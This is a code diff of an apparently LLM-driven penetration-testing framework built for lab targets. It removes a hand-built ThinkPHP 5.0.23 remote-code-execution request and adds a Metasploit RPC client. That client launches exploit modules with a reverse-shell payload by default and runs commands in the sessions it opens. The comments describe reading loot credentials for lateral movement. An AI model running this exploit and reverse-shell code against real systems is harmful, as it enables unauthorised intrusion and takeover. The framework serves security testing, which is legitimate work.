-    if protocol in {"http", "https"}:
-        result = _http_probe(
-            {
-                "target": host,
-                "port": port,
-                "scheme": protocol,
-                "path": arguments.get("path", "/"),
-                "timeout_seconds": arguments.get("timeout_seconds"),
-            }
-        )
-    else:
-        result = _tcp_connect_probe({"host": host, "port": port, "timeout_seconds": arguments.get("timeout_seconds")})
-    parsed = result.get("parsed") if isinstance(result.get("parsed"), dict) else _default_parsed()
-    parsed["entities"].append(
-        {
-            "type": "InternalService",
-            "host": host,
-            "port": port,
-            "protocol": protocol,
-            "via_pivot_route": None,
-            "confidence": 0.75 if result.get("success") else 0.25,
-        }
-    )
-    parsed["evidence"].append({"kind": "reachability evidence", "host": host, "port": port, "via_pivot_route": None})
-    result["parsed"] = parsed
-    return result
 
 
 def _goal_check(arguments: dict[str, Any]) -> dict[str, Any]:
@@ -1847,306 +1225,6 @@ _SAFE_OUTPUT_PREFIX = "/opt/aegra/"
 _SAFE_OBSERVE_ZONES = {"flags", "hints", "loot"}
 
 
-def _load_exploit_profile(profile_id: str) -> dict[str, Any] | None:
-    """Load an exploit profile YAML from configs/exploit_profiles/. Cached per process."""
-    if profile_id in _EXPLOIT_PROFILE_CACHE:
-        return _EXPLOIT_PROFILE_CACHE[profile_id]
-    safe_id = re.sub(r"[^A-Za-z0-9_\-]", "", profile_id)
-    if not safe_id:
-        return None
-    profiles_dir = Path("configs/exploit_profiles")
-    candidate_names = [safe_id]
-    normalized_id = safe_id.replace("-", "_")
-    if normalized_id != safe_id:
-        candidate_names.append(normalized_id)
-    candidate = next(
-        (
-            path
-            for name in candidate_names
-            for path in (profiles_dir / f"{name}.yml", profiles_dir / f"{name}.yaml")
-            if path.exists()
-        ),
-        None,
-    )
-    try:
-        import yaml  # type: ignore[import-not-found]
-    except Exception:
-        return None
-    if candidate is not None:
-        try:
-            payload = yaml.safe_load(candidate.read_text(encoding="utf-8")) or {}
-        except Exception:
-            payload = None
-        if isinstance(payload, dict):
-            _EXPLOIT_PROFILE_CACHE[safe_id] = payload
-            return payload
-    # Fallback: the caller often passes the *vulnerability* profile id
-    # (e.g. "struts2-s2-045") rather than the *exploit* profile id
-    # ("struts2-s2-045-lab-exploit"). Scan the profiles and match on the declared
-    # exploit_profile_id — exact, or the request as a prefix of it.
-    for path in sorted(profiles_dir.glob("*.yml")) + sorted(profiles_dir.glob("*.yaml")):
-        try:
-            payload = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
-        except Exception:
-            continue
-        if not isinstance(payload, dict):
-            continue
-        pid = str(payload.get("exploit_profile_id") or path.stem)
-        vid = str(payload.get("vuln_profile_id") or "")
-        # Prefer the explicit vuln_profile_id link (the agent passes the recorded
-        # vulnerability id); fall back to exploit-id prefix/equality.
-        if (
-            profile_id in {pid, vid}
-            or safe_id in {pid, vid}
-            or pid.startswith(f"{safe_id}-")
-            or safe_id.startswith(f"{pid}-")
-        ):
-            _EXPLOIT_PROFILE_CACHE[safe_id] = payload
-            return payload
-    return None
-
-
-def _available_exploit_profile_ids() -> list[str]:
-    """List the declared exploit_profile_id of every profile on disk.
-
-    Surfaced in the exploit_profile_not_found error so the agent can self-correct
-    when it passes a mangled/abbreviated id (e.g. "thinkphp-5-rce" instead of
-    "thinkphp-5-0-23-lab-exploit") that none of the resolution paths can match.
-    """
-
-    profiles_dir = Path("configs/exploit_profiles")
-    try:
-        import yaml  # type: ignore[import-not-found]
-    except Exception:
-        return []
-    ids: list[str] = []
-    for path in sorted(profiles_dir.glob("*.yml")) + sorted(profiles_dir.glob("*.yaml")):
-        try:
-            payload = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
-        except Exception:
-            continue
-        if isinstance(payload, dict):
-            ids.append(str(payload.get("exploit_profile_id") or path.stem))
-    return sorted(dict.fromkeys(ids))
-
-
-_VULN_PROFILE_CACHE: dict[str, VulnerabilityProfile] | None = None
-
-
-def _load_vuln_profiles() -> dict[str, VulnerabilityProfile]:
-    """Load the real CVE vulnerability profiles from configs/vuln_profiles/ and map
-    them onto the matcher's VulnerabilityProfile schema. Cached per process.
-
-    Without this the matcher only knows the generic lab stubs, so a discovered
-    service (ThinkPHP/Struts2/Flask) can never produce a VulnerabilityCandidate,
-    leaving the success contract's vulnerability_candidate_recorded unsatisfiable.
-    """
-
-    global _VULN_PROFILE_CACHE
-    if _VULN_PROFILE_CACHE is not None:
-        return _VULN_PROFILE_CACHE
-    loaded: dict[str, VulnerabilityProfile] = {}
-    try:
-        import yaml  # type: ignore[import-not-found]
-        profiles_dir = Path("configs/vuln_profiles")
-        paths = sorted(profiles_dir.glob("*.yml")) + sorted(profiles_dir.glob("*.yaml"))
-    except Exception:
-        paths = []
-    for path in paths:
-        try:
-            payload = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
-        except Exception:
-            continue
-        if not isinstance(payload, dict):
-            continue
-        vid = _string(payload.get("vuln_profile_id")) or path.stem
-        signals = payload.get("fingerprint_signals") if isinstance(payload.get("fingerprint_signals"), dict) else {}
-        products = [str(p) for p in (signals.get("products") or []) if str(p).strip()]
-        versions = [str(v) for v in (signals.get("version_ranges") or []) if str(v).strip()]
-        path_markers = [str(p) for p in (signals.get("path_markers") or []) if str(p).strip()]
-        methods = [str(m) for m in (payload.get("safe_validation_methods") or []) if str(m).strip()]
-        try:
-            loaded[vid] = VulnerabilityProfile(
-                vulnerability_id=vid,
-                cve=_string(payload.get("cve")),
-                affected_products=products,
-                required_service=None,  # match on product fingerprint, not exact service name
-                required_version_range=versions[0] if versions else None,
-                required_paths=path_markers,
-                safe_validation_methods=methods,
-            )
-        except Exception:
-            continue
-    _VULN_PROFILE_CACHE = loaded
-    return loaded
-
-
-def _validation_profiles() -> dict[str, VulnerabilityProfile]:
-    """All matchable vuln profiles: real CVE profiles + the generic lab stubs."""
-
-    return {**SAFE_VALIDATION_PROFILES, **_load_vuln_profiles()}
-
-
-def _lab_authorized_exploit_execute(arguments: dict[str, Any]) -> dict[str, Any]:
-    profile_id = _required(arguments, "exploit_profile_id")
-    target_url = _required(arguments, "target_url")
-    timeout = _int(arguments.get("timeout_seconds"), DEFAULT_COMMAND_TIMEOUT_SECONDS)
-
-    profile = _load_exploit_profile(profile_id)
-    if profile is None:
-        available = _available_exploit_profile_ids()
-        return _payload(
-            success=False,
-            stderr=(
-                f"exploit profile not found: {profile_id}. "
-                f"Available exploit_profile_id values: {', '.join(available) or '(none)'}. "
-                "Retry with one of these exact ids."
-            ),
-            exit_code="exploit_profile_not_found",
-            parsed={
-                "runtime_hints": {
-                    "blocked_by": "exploit_profile_not_found",
-                    "exploit_profile_id": profile_id,
-                    "available_exploit_profile_ids": available,
-                }
-            },
-        )
-
-    # Validate allowed_operations are present and non-destructive
-    allowed_ops = profile.get("allowed_operations") or []
-    if not allowed_ops:
-        return _payload(
-            success=False,
-            stderr=f"exploit profile {profile_id} has no allowed_operations — execution blocked",
-            exit_code="no_allowed_operations",
-            parsed={"runtime_hints": {"blocked_by": "no_allowed_operations", "exploit_profile_id": profile_id}},
-        )
-
-    # Validate evidence_output_paths only use /opt/aegra/
-    for output_path in profile.get("evidence_output_paths") or []:
-        if not str(output_path).startswith(_SAFE_OUTPUT_PREFIX):
-            return _payload(
-                success=False,
-                stderr=f"exploit profile {profile_id} references unsafe output path: {output_path}",
-                exit_code="unsafe_output_path",
-                parsed={"runtime_hints": {"blocked_by": "unsafe_output_path"}},
-            )
-
-    session_id = _string(arguments.get("session_id"))
-    route_id = _string(arguments.get("route_id"))
-
-    # The profile's target hint remains authoritative for the request path so a
-    # relative payload string can never replace the authorized target.
-    target_hints = profile.get("target_hints") if isinstance(profile.get("target_hints"), dict) else {}
-    vuln_path = _string(target_hints.get("vuln_path")) or "/"
-    request_url = urljoin(target_url.rstrip("/") + "/", vuln_path.lstrip("/"))
-
-    # Resolve the bounded RCE parameters: explicit extra_params win, otherwise the
-    # profile's default post-access observation. The exploit invokes safe_func on
-    # safe_arg inside the target app (e.g. system("cat /opt/aegra/loot/pivot_access.env")).
-    extra = arguments.get("extra_params") if isinstance(arguments.get("extra_params"), dict) else {}
-    post_access_cfg = profile.get("post_access_capability") if isinstance(profile.get("post_access_capability"), dict) else {}
-    default_obs = post_access_cfg.get("default_observation") if isinstance(post_access_cfg.get("default_observation"), dict) else {}
-    safe_func = _string(extra.get("safe_func")) or _string(default_obs.get("safe_func")) or "system"
-    safe_arg = _string(extra.get("safe_arg")) or _string(default_obs.get("safe_arg")) or ""
-    success_contains = _string(extra.get("success_contains")) or _string(default_obs.get("success_contains"))
-    method = (_string(target_hints.get("method")) or "POST").upper()
-
-    # ThinkPHP 5.0.23 `_method=__construct` RCE: run safe_func(safe_arg) in-app and
-    # read the command output from the response body.
-    rce_body = urlencode(
-        {"_method": "__construct", "filter[]": safe_func, "method": "get", "server[REQUEST_METHOD]": safe_arg}
-    ).encode("utf-8")
-
-    result_stdout = ""
-    result_success = False
-    command_output = ""
-    executed_steps: list[str] = []
-    try:
-        response = _open_url(
-            request_url,
-            method=method,
-            timeout=timeout,
-            headers={"Content-Type": "application/x-www-form-urlencoded"},
-            data=rce_body if method == "POST" else None,
-        )
-        command_output = str(response.get("body_excerpt") or "")
-        status = int(response["status"])
-        # Success means the bounded command actually executed: prefer a content
-        # marker (the read loot), fall back to a non-error status.
-        result_success = (success_contains in command_output) if success_contains else (status < 500)
-        result_stdout = json.dumps(
-            {
-                "url": request_url,
-                "status": status,
-                "body_excerpt_sha256": hashlib.sha256(command_output.encode("utf-8", errors="replace")).hexdigest(),
-                "command_output": command_output if result_success else "",
-            },
-            sort_keys=True,
-        )
-        executed_steps.append(f"thinkphp_rce:{safe_func}:{request_url}")
-    except Exception as exc:
-        result_success = False
-        executed_steps.append(f"exploit_failed:{exc!s:.120}")
-
-    capability_id = f"exploit-capability::{profile_id}::{_safe_artifact_name(target_url)}"
-    parsed = _default_parsed()
-    parsed["entities"].append({
-        "type": "ExploitCapability",
-        "capability_id": capability_id,
-        "exploit_profile_id": profile_id,
-        "target_url": target_url,
-        "session_id": session_id,
-        "route_id": route_id,
-        "allowed_operations": allowed_ops,
-        "executed_steps": executed_steps,
-        "confidence": 0.8 if result_success else 0.3,
-    })
-    parsed["evidence"].append({
-        "kind": "exploit_execution_evidence",
-        "capability_id": capability_id,
-        "exploit_profile_id": profile_id,
-        "target_url": target_url,
-        "success": result_success,
-        "executed_steps": executed_steps,
-    })
-    parsed["runtime_hints"] = {
-        "exploit_executed": result_success,
-        "exploit_profile_id": profile_id,
-        "capability_id": capability_id,
-        "session_id": session_id,
-        "route_id": route_id,
-    }
-    post_access = profile.get("post_access_capability")
-    if isinstance(post_access, dict):
-        parsed["runtime_hints"].update(
-            {
-                "capability_kind": post_access.get("capability_kind"),
-                "post_access_observable": result_success,
-                "observable_zones": list(post_access.get("observable_zones") or []),
-                "safe_paths": list(post_access.get("safe_paths") or []),
-                "next_tools": list(post_access.get("suggested_next_tools") or []),
-                # The bounded command output (e.g. read loot creds) so the chain can
-                # use a discovered pivot hint for lateral movement into the restricted zone.
-                "post_access_output": command_output if result_success else "",
-            }
-        )
-        parsed["entities"][0].update(
-            {
-                "capability_kind": post_access.get("capability_kind"),
-                "post_access_observable": result_success,
-                "observable_zones": list(post_access.get("observable_zones") or []),
-                "safe_paths": list(post_access.get("safe_paths") or []),
-            }
-        )
-    parsed["writeback_hints"] = {
-        "observation_category": "exploit_execution",
-        "exploit_profile_id": profile_id,
-        "target_url": target_url,
-    }
-    return _payload(success=result_success, stdout=result_stdout, exit_code=0 if result_success else "exploit_failed", parsed=parsed)
-
-
 def _post_access_observe(arguments: dict[str, Any]) -> dict[str, Any]:
     zone = (_string(arguments.get("zone")) or "hints").lower()
     if zone not in _SAFE_OBSERVE_ZONES:
@@ -2262,47 +1340,6 @@ def _read_lab_marker(arguments: dict[str, Any]) -> dict[str, Any]:
     parsed["writeback_hints"] = {"observation_category": "goal_marker_check", "marker_id": marker_id}
     result = {"marker_found": True, "marker_id": marker_id, "proof_token": proof_token, "evidence_id": evidence_id}
     return _payload(success=True, stdout=json.dumps(result, sort_keys=True), parsed=parsed)
-
-
-def _pivot_route_register(arguments: dict[str, Any]) -> dict[str, Any]:
-    host = _required(arguments, "destination_host")
-    port = _int(arguments.get("destination_port"), 0)
-    if port <= 0 or port > 65535:
-        raise ValueError("destination_port must be between 1 and 65535")
-    protocol = (_string(arguments.get("protocol")) or "tcp").lower()
-    route_id = _string(arguments.get("route_id")) or (
-        f"route::{_string(arguments.get('source_host')) or 'unknown'}::{host}:{port}"
-    )
-    zone_ref = _string(arguments.get("zone_ref"))
-    parsed = _default_parsed()
-    entity = {
-        "type": "PivotRoute",
-        "route_id": route_id,
-        "source_host": _string(arguments.get("source_host")),
-        "via_host": _string(arguments.get("via_host")),
-        "destination_host": host,
-        "port": port,
-        "protocol": protocol,
-        "zone_ref": zone_ref,
-        "status": "registered",
-        "confidence": 0.9,
-    }
-    parsed["entities"].append(entity)
-    parsed["evidence"].append({"kind": "pivot_route_registration", "route_id": route_id, "destination_host": host, "port": port})
-    parsed["runtime_hints"] = {
-        "register_pivot_route": True,
-        "route_id": route_id,
-        "destination_host": host,
-        "source_host": _string(arguments.get("source_host")),
-        "via_host": _string(arguments.get("via_host")),
-        "session_id": _string(arguments.get("session_id")),
-        "allowed_ports": [port],
-        "protocol": protocol,
-        "zone_ref": zone_ref,
-        "reachable": True,
-    }
-    parsed["writeback_hints"] = {"observation_category": "pivot_route_registration", "route_id": route_id}
-    return _payload(success=True, stdout=json.dumps(entity, ensure_ascii=True, sort_keys=True), parsed=parsed)
 
 
 def _internal_goal_check(arguments: dict[str, Any]) -> dict[str, Any]:
@@ -2477,78 +1514,6 @@ def _normalize_nmap_host(value: str) -> str | None:
     if paren_match:
         return paren_match.group("address")
     return text.split()[0] if text.split() else None
-
-
-def _profile(profile_id: str) -> VulnerabilityProfile:
-    try:
-        return SAFE_VALIDATION_PROFILES[profile_id]
-    except KeyError:
-        pass
-    # yml-loaded profiles are keyed by filename stem, but vuln_profile_match
-    # advertises profile.vulnerability_id (which can differ, e.g. hyphens vs
-    # underscores), so resolve by that too instead of failing the chain.
-    for profile in SAFE_VALIDATION_PROFILES.values():
-        if profile.vulnerability_id == profile_id:
-            return profile
-    raise ValueError(f"unknown validation profile: {profile_id}")
-
-
-def _run_profile_prechecks(*, target_url: str, profile: VulnerabilityProfile, timeout: int) -> list[dict[str, Any]]:
-    checks: list[dict[str, Any]] = []
-    base_url = target_url.rstrip("/") + "/"
-    for raw_path in profile.required_paths or ["/"]:
-        path = "/" + str(raw_path).lstrip("/")
-        url = urljoin(base_url, path.lstrip("/"))
-        try:
-            response = _open_url(url, method="GET", timeout=timeout)
-            checks.append(
-                {
-                    "type": "http_path",
-                    "url": url,
-                    "status": response["status"],
-                    "passed": int(response["status"]) < 500,
-                }
-            )
-        except Exception as exc:
-            checks.append({"type": "http_path", "url": url, "passed": False, "error": str(exc)})
-    return checks
-
-
-def _validation_payload(*, validation: ValidationResult, target_url: str, success: bool) -> dict[str, Any]:
-    validation_payload = validation.model_dump(mode="json")
-    parsed = _default_parsed()
-    finding = {
-        "kind": "ValidatedVulnerability" if validation.status == "validated" else "RejectedVulnerabilityCandidate",
-        "vulnerability_id": validation.vulnerability_id,
-        "candidate_id": validation.vulnerability_id,
-        "status": validation.status,
-        "confidence": validation.confidence,
-        "evidence_refs": [],
-    }
-    parsed["findings"].append(finding)
-    parsed["evidence"].append(
-        {
-            "kind": "validation evidence",
-            "candidate_id": validation.vulnerability_id,
-            "summary": validation.safe_payload_summary,
-            "confidence": validation.confidence,
-        }
-    )
-    parsed["runtime_hints"] = {
-        "validated": validation.status == "validated",
-        "requires_auth": False,
-        "validation_status": validation.status,
-        "vulnerability_id": validation.vulnerability_id,
-    }
-    parsed["writeback_hints"] = {"observation_category": "vulnerability_validation", "url": target_url}
-    parsed["validation"] = validation_payload
-    return _payload(
-        success=success,
-        stdout=json.dumps(finding, ensure_ascii=True, sort_keys=True),
-        stderr=validation.failure_reason or "",
-        exit_code=0 if success else validation.status,
-        parsed=parsed,
-    )
 
 
 def _parsed_http(*, url: str, response: dict[str, Any]) -> dict[str, Any]:
@@ -2784,6 +1749,203 @@ def _merge_parsed(parsed: dict[str, Any] | None) -> dict[str, Any]:
         for key, value in parsed.items():
             merged[key] = value
     return merged
+
+
+# ---------------------------------------------------------------------------
+# Metasploit RPC engine (Step 5 / cg.md G.5 stage 1a: real exploit -> Session)
+# ---------------------------------------------------------------------------
+# The heavy msf framework runs in a dedicated msfrpcd sidecar (see
+# lab/environments/full_chain_lab/docker-compose.msf.yml); this module is only a
+# thin pymetasploit3 client. metasploit_exec runs an exploit module and, on
+# success, the opened session_id flows through parsed.session_id ->
+# ToolTraceFactExtractor._extract_session -> KG Session, satisfying success
+# contract #7/#8 with a REAL session (the real-tool replacement for the canned
+# lab_authorized_exploit_execute / ExploitCapability).
+
+
+def _load_msf_config() -> dict[str, Any] | None:
+    """Read msfrpcd connection config from runtime policy adapter_policy.metasploit."""
+
+    path = _string(os.getenv("AEGRA_RUNTIME_POLICY_PATH"))
+    if not path or not Path(path).exists():
+        return None
+    try:
+        policy = json.loads(Path(path).read_text(encoding="utf-8"))
+    except (OSError, ValueError):
+        return None
+    adapter_policy = policy.get("adapter_policy") if isinstance(policy, dict) else None
+    msf = adapter_policy.get("metasploit") if isinstance(adapter_policy, dict) else None
+    return dict(msf) if isinstance(msf, dict) else None
+
+
+def _msf_available() -> bool:
+    """msf tools are listable only when configured AND the client lib is importable."""
+
+    if _load_msf_config() is None:
+        return False
+    try:
+        import pymetasploit3  # noqa: F401
+    except Exception:
+        return False
+    return True
+
+
+def _msf_client(config: dict[str, Any]):
+    """Connect to the configured msfrpcd. Isolated so tests can monkeypatch it."""
+
+    from pymetasploit3.msfrpc import MsfRpcClient
+
+    return MsfRpcClient(
+        str(config.get("password") or ""),
+        server=str(config.get("host") or "127.0.0.1"),
+        port=int(config.get("port") or 55553),
+        ssl=bool(config.get("ssl", False)),
+        username=str(config.get("username") or "msf"),
+    )
+
+
+def _msf_host_from_target(target: str) -> str:
+    text = str(target or "").strip()
+    if "://" in text:
+        return urlparse(text).hostname or text
+    if ":" in text and re.match(r"^\d{1,3}(?:\.\d{1,3}){3}", text):
+        return text.split(":", 1)[0]
+    return text
+
+
+def _msf_wait_for_session(client: Any, before: set[str], timeout: int) -> str | None:
+    deadline = time.time() + max(timeout, 5)
+    while time.time() < deadline:
+        new = {str(k) for k in client.sessions.list.keys()} - before
+        if new:
+            return sorted(new)[0]
+        time.sleep(3)
+    return None
+
+
+def _metasploit_exec(arguments: dict[str, Any]) -> dict[str, Any]:
+    config = _load_msf_config()
+    if config is None:
+        return _payload(
+            success=False,
+            stderr="metasploit RPC is not configured (adapter_policy.metasploit)",
+            exit_code="msf_not_configured",
+            parsed={"runtime_hints": {"blocked_by": "msf_not_configured"}},
+        )
+    module_name = _string(arguments.get("module"))
+    target = _string(arguments.get("target") or arguments.get("rhosts") or arguments.get("target_url"))
+    if not module_name or not target:
+        return _payload(success=False, stderr="module and target are required", exit_code="invalid_arguments")
+    rhost = _msf_host_from_target(target)
+    timeout = max(5, _int(arguments.get("timeout_seconds"), 90))
+    wait_timeout = max(3, timeout - 5)
+    try:
+        client = _msf_client(config)
+    except Exception as exc:  # noqa: BLE001 - surface any connection failure to the LLM
+        return _payload(
+            success=False,
+            stderr=f"msfrpcd connection failed: {exc}",
+            exit_code="msf_unreachable",
+            parsed={"runtime_hints": {"blocked_by": "msf_unreachable"}},
+        )
+    try:
+        mtype, mpath = module_name.split("/", 1) if "/" in module_name else ("exploit", module_name)
+        exploit = client.modules.use(mtype, mpath)
+        exploit["RHOSTS"] = rhost
+        if arguments.get("rport"):
+            exploit["RPORT"] = _int(arguments.get("rport"), 0)
+        if arguments.get("target_uri"):
+            exploit["TARGETURI"] = _string(arguments.get("target_uri"))
+        options = arguments.get("options")
+        if isinstance(options, dict):
+            for key, value in options.items():
+                exploit[str(key)] = value
+        payload_name = _string(arguments.get("payload")) or "linux/x64/shell_reverse_tcp"
+        payload = client.modules.use("payload", payload_name)
+        lhost = _string(arguments.get("lhost")) or _string(config.get("lhost"))
+        if lhost:
+            payload["LHOST"] = lhost
+        payload["LPORT"] = _int(arguments.get("lport"), 4444)
+        before = {str(k) for k in client.sessions.list.keys()}
+        exploit.execute(payload=payload)
+        session_id = _msf_wait_for_session(client, before, wait_timeout)
+    except Exception as exc:  # noqa: BLE001
+        return _payload(success=False, stderr=f"metasploit_exec failed: {exc}", exit_code="msf_exec_error")
+    if session_id is None:
+        parsed = _default_parsed()
+        parsed["runtime_hints"] = {
+            "module": module_name,
+            "target_ref": target,
+            "bound_target": rhost,
+            "exploit_executed": True,
+            "session_opened": False,
+            "wait_timeout_seconds": wait_timeout,
+        }
+        parsed["writeback_hints"] = {"observation_category": "exploit_attempt"}
+        return _payload(
+            success=True,
+            stdout=json.dumps(
+                {
+                    "module": module_name,
+                    "target": rhost,
+                    "session_opened": False,
+                    "result": "no_session",
+                },
+                ensure_ascii=True,
+                sort_keys=True,
+            ),
+            stderr="exploit ran but no session opened within timeout",
+            exit_code="no_session",
+            parsed=parsed,
+        )
+    try:
+        info = dict(client.sessions.list.get(session_id) or {})
+    except Exception:  # noqa: BLE001
+        info = {}
+    parsed = _default_parsed()
+    parsed["session_id"] = session_id
+    parsed["entities"].append(
+        {"type": "session", "session_id": session_id, "bound_target": rhost, "via_exploit": module_name}
+    )
+    parsed["runtime_hints"] = {
+        "session_id": session_id,
+        "open_session": True,
+        "bound_target": rhost,
+        "via_exploit": module_name,
+        "session_type": _string(info.get("type")),
+        "module": module_name,
+    }
+    parsed["writeback_hints"] = {"observation_category": "exploit_session"}
+    return _payload(
+        success=True,
+        stdout=json.dumps({"session_id": session_id, "target": rhost, "type": info.get("type")}, ensure_ascii=True, sort_keys=True),
+        parsed=parsed,
+    )
+
+
+def _session_exec(arguments: dict[str, Any]) -> dict[str, Any]:
+    config = _load_msf_config()
+    if config is None:
+        return _payload(success=False, stderr="metasploit RPC is not configured", exit_code="msf_not_configured")
+    session_id = _string(arguments.get("session_id"))
+    command = _string(arguments.get("command"))
+    argv = arguments.get("argv")
+    if not command and isinstance(argv, list):
+        command = " ".join(str(item) for item in argv)
+    if not session_id or not command:
+        return _payload(success=False, stderr="session_id and command/argv are required", exit_code="invalid_arguments")
+    timeout = _int(arguments.get("timeout_seconds"), 30)
+    try:
+        client = _msf_client(config)
+        shell = client.sessions.session(session_id)
+        shell.write(command + "\n")
+        time.sleep(min(max(timeout, 2), 10))
+        output = shell.read()
+    except Exception as exc:  # noqa: BLE001
+        return _payload(success=False, stderr=f"session_exec failed: {exc}", exit_code="msf_session_error")
+    parsed = _default_parsed()
+    parsed["runtime_hints"] = {"session_id": session_id, "session_command_executed": True}
+    return _payload(success=True, stdout=str(output)[:MAX_OUTPUT_CHARS], parsed=parsed)
 
 
 def _lab_mode_enabled() -> bool:
